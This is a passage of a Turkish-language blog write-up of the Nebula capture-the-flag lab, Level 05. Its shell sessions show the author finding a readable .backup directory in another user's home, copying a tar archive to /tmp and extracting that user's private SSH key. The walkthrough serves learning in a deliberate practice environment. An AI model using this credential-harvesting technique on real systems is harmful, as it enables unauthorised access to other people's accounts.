---
layout: post
title: "Nebula Write Up-2"
date: 2018-02-28
excerpt: "[Level 05-Level 09]"
comments: false
---
### Level 05

/home/flag05 dizininde, izinleri hatalı olabilecek olan bir dizin arıyoruz. 
{% raw %}
    level05@nebula:/home/flag05$ ls -al
    total 5
    drwxr-x--- 1 flag05 level05  100 2012-08-18 03:22 .
    drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
    drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
    -rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
    -rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
    -rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
    drwx------ 1 flag05 flag05   100 2011-11-20 03:07 .ssh
{% endraw %}
Dikkatimizi çeken .ssh ve .backup dizinleri. Fakat .ssh dizininin izinleri olması gerektiği gibi. .backup dizinini kurcalamaya devam ediyoruz.
> Bir dizin için ls komutunu kullanabilmek için  okuma(r) , cd komutunu kullanabilmek için çalıştırma(x) iznimizin bulunması gerekir.
{% raw %}
    level05@nebula:/home/flag05$ cd .backup
    level05@nebula:/home/flag05/.backup$
    drwxr-x--- 1 flag05 flag05    100  2011-11-20 03:22 .
    drwxr-xr-x 1 flag05 level05    80  2012-08-18 07:18 ..
    -rw-rw-r-- 1 flag05 flag05   1826  2011-11-20 20:13 backup-19072011.tgz
{% endraw %}
Yeterli izinlerimizin olmaması sebebiyle tar dosyasını bulunduğumuz yerde açamıyoruz. 
{% raw %}
    level05@nebula:/home/flag05/.backup$ cp backup-19072011.tgz /tmp
    level05@nebula:/home/flag05/.backup$ cd /tmp
    level05@nebula:/tmp$ ls -l
    -rw-rw-r-- 1 level05 level05   1826  2011-11-20 20:13 backup-19072011.tgz
    level05@nebula:/tmp$ tar -xvf backup-19072011.tgz
    .ssh/
    .ssh/id_rsa.pub
    .ssh/id_rsa
    .ssh/authorized_keys
{% endraw %}
